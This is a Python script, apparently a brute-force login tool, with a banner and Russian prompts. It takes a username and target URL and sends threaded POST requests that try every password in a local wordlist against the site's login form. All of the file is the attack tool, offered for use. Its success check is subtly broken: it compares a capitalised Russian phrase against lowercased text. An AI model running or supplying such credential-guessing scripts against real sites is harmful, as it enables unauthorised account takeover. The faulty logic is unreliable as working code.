import requests
import threading
import time

print (""" 


██╗░░██╗░█████╗░██╗░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░██╔╝██╔══██╗██║░░░██║██╔══██╗██╔══██╗██║░░██║
█████═╝░██║░░██║╚██╗░██╔╝███████║██║░░╚═╝███████║
██╔═██╗░██║░░██║░╚████╔╝░██╔══██║██║░░██╗██╔══██║
██║░╚██╗╚█████╔╝░░╚██╔╝░░██║░░██║╚█████╔╝██║░░██║
╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

""")


def try_password(username, password, url):
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        if "Пароль успешный" in response.text.lower():
            print(f"[+] Успешный вход: {username}:{password}")
            exit()  
    else:
        print(f"[×] Неожиданный код ответа: {username}:{password} - Status Code: {response.status_code}")

def main():
    username = input("Введите имя пользователя: ")
    url = input("Введите URL-адрес веб-сайта: ")
    print("""Начинаем атаку 
          [+]█████████████████████████████████████████████████[+]
  """)

    with open('passwords.txt', 'r') as passwords_file:
        passwords = passwords_file.read().splitlines()

    max_threads = 10  
    delay_between_threads = 1 

    threads = []
    for i, password in enumerate(passwords):
        thread = threading.Thread(target=try_password, args=(username, password, url))
        threads.append(thread)
        thread.start()
        if i % max_threads == max_threads - 1:
            time.sleep(delay_between_threads)  

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
